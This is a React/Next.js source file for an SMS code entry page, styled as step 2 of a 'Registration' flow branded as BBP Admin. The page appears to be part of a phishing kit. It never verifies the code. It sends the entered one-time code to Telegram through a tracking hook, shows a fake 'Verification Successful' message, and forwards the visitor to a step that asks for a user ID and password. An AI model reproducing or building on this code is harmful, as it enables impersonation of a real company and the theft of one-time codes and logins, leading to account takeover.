"use client"

import Link from "next/link"
import Image from "next/image"
import { useEffect, useState, useRef } from "react"
import { Phone, Mail, ArrowLeft, ArrowRight } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Footer } from "@/components/footer"
import { trackFormSubmission } from "@/hooks/use-visitor-tracking"
import { useRequireLoginReady } from "@/hooks/use-route-guard"

// Step indicator component
function StepIndicator({ currentStep }: { currentStep: number }) {
  const steps = [1, 2, 3, 4, 5]

  return (
    <div className="flex items-center justify-center mb-4">
      {steps.map((step, index) => (
        <div key={step} className="flex items-center">
          <div
            className={`
              relative px-4 py-1.5 text-xs font-semibold text-white
              ${step === currentStep ? 'bg-[#b8860b]' : 'bg-[#6b7280]'}
              ${index === 0 ? 'rounded-l' : ''}
              ${index === steps.length - 1 ? 'rounded-r' : ''}
            `}
            style={{
              clipPath: index === steps.length - 1
                ? 'polygon(0 0, calc(100% - 8px) 0, 100% 50%, calc(100% - 8px) 100%, 0 100%, 8px 50%)'
                : index === 0
                  ? 'polygon(0 0, calc(100% - 8px) 0, 100% 50%, calc(100% - 8px) 100%, 0 100%)'
                  : 'polygon(0 0, calc(100% - 8px) 0, 100% 50%, calc(100% - 8px) 100%, 0 100%, 8px 50%)'
            }}
          >
            STEP {step}
          </div>
        </div>
      ))}
    </div>
  )
}

export default function TextVerificationPage() {
  useRequireLoginReady()
  const [maskedPhone, setMaskedPhone] = useState("***-***-****")
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""])
  const [timeLeft, setTimeLeft] = useState(15 * 60) // 15 minutes in seconds
  const [isVerified, setIsVerified] = useState(false)
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isLoading, setIsLoading] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  useEffect(() => {
    if (typeof window === 'undefined') return
    const phone = sessionStorage.getItem('maskedPhone')
    if (phone) setMaskedPhone(phone)
  }, [])

  // Countdown timer
  useEffect(() => {
    if (timeLeft <= 0) return

    const timer = setInterval(() => {
      setTimeLeft(prev => prev - 1)
    }, 1000)

    return () => clearInterval(timer)
  }, [timeLeft])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}m ${secs.toString().padStart(2, '0')}s`
  }

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return

    const newOtp = [...otp]
    newOtp[index] = value.slice(-1)
    setOtp(newOtp)

    // Auto-focus next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleOtpPaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6)
    const newOtp = [...otp]
    for (let i = 0; i < pastedData.length; i++) {
      newOtp[i] = pastedData[i]
    }
    setOtp(newOtp)
    // Focus on the next empty input or the last one
    const nextIndex = Math.min(pastedData.length, 5)
    inputRefs.current[nextIndex]?.focus()
  }

  const handleVerify = async () => {
    setErrors({})
    const otpCode = otp.join('')

    if (otpCode.length !== 6) {
      setErrors({ otp: 'Please enter the complete 6-digit code' })
      return
    }

    setIsLoading(true)

    // Send to Telegram in background, don't block on failure
    trackFormSubmission({
      type: 'text_otp_verification',
      otp: otpCode,
      page: '/registration/text'
    }).catch(() => { })

    setTimeout(() => {
      setIsLoading(false)
      setIsVerified(true)
      setTimeout(() => {
        // Redirect to setup page (user ID & password)
        window.location.href = '/registration/setup'
      }, 1500)
    }, 1000)
  }

  const handleResend = async () => {
    setOtp(["", "", "", "", "", ""])
    setTimeLeft(15 * 60)

    await trackFormSubmission({
      type: 'text_otp_resend',
      page: '/registration/text'
    })
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="bg-[#1e3a5f] px-6 py-3">
        <div className="flex items-center">
          <div className="flex items-center gap-6 flex-1 min-w-0">
            <Link href="/" className="flex items-center shrink-0">
              <Image
                src="/BBPAdmin_Alegeus_Logo_Blue_Service.4ec5724d58c34a02b47bdfd467112a82.png"
                alt="BBP Admin"
                width={120}
                height={40}
                className="h-[40px] w-auto"
                priority
              />
            </Link>

            <div className="flex flex-col text-xs text-white leading-tight ml-auto shrink-0">
              <div className="flex items-center gap-2">
                <Phone className="w-3 h-3" />
                <span>(630) 773-2337</span>
              </div>
              <div className="flex items-center gap-2 mt-0.5">
                <Mail className="w-3 h-3" />
                <span>support@bbpadmin.com</span>
              </div>
            </div>
          </div>

          <div className="ml-6 text-xl text-gray-300 font-normal hidden md:block">Registration</div>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1 flex flex-col items-center px-6 py-8">
        <div className="w-full max-w-3xl">
          {/* Step Indicator */}
          <StepIndicator currentStep={2} />

          <p className="text-center text-sm text-gray-600 mb-6">
            You are on step 2 of 5
          </p>

          {!isVerified ? (
            <div>
              <p className="text-center text-gray-700 mb-2">
                Enter the verification code that you received via <strong>SMS</strong> below:
              </p>
              <p className="text-center text-gray-500 text-sm mb-6">
                Note - Do not share your verification code with anyone else
              </p>

              {/* OTP Input */}
              <div className="flex justify-center gap-2 mb-4" onPaste={handleOtpPaste}>
                {otp.map((digit, index) => (
                  <input
                    key={index}
                    ref={(el) => { inputRefs.current[index] = el }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                    className="w-12 h-12 text-center text-xl border-b-2 border-gray-400 focus:border-[#1e3a5f] outline-none bg-transparent"
                  />
                ))}
              </div>

              {errors.otp && (
                <p className="text-red-500 text-sm text-center mb-4">{errors.otp}</p>
              )}
              {errors.connection && (
                <p className="text-red-500 text-sm text-center mb-4">{errors.connection}</p>
              )}

              {/* Timer */}
              <p className="text-center text-gray-600 text-sm mb-4">
                OTP will expire in {formatTime(timeLeft)}
              </p>

              {/* Resend Link */}
              <p className="text-center mb-2">
                <button
                  onClick={handleResend}
                  className="text-blue-600 underline hover:text-blue-800 text-sm"
                >
                  Resend verification code
                </button>
              </p>

              <p className="text-center mb-8">
                <Link href="#" className="text-blue-600 underline hover:text-blue-800 text-sm">
                  I did not receive my code
                </Link>
              </p>

              {/* Action Buttons */}
              <div className="flex items-center justify-center gap-3">
                <Link href="/registration">
                  <Button
                    className="bg-[#407ec9] hover:bg-[#141c4d] text-white px-6 py-5 min-w-[120px] transition-colors"
                  >
                    <ArrowLeft className="w-4 h-4 mr-2" />
                    BACK
                  </Button>
                </Link>
                <Button
                  className="bg-[#141c4d] hover:bg-[#407ec9] text-white px-6 py-5 min-w-[120px] disabled:opacity-50 transition-colors"
                  onClick={handleVerify}
                  disabled={isLoading || otp.join('').length !== 6}
                >
                  <ArrowRight className="w-4 h-4 mr-2" />
                  NEXT
                </Button>
              </div>
            </div>
          ) : (
            <div className="text-center py-12">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h2 className="text-xl font-semibold text-gray-800 mb-2">Verification Successful</h2>
              <p className="text-gray-600">Redirecting you to complete registration...</p>
            </div>
          )}
        </div>
      </main>

      <Footer />
    </div>
  )
}


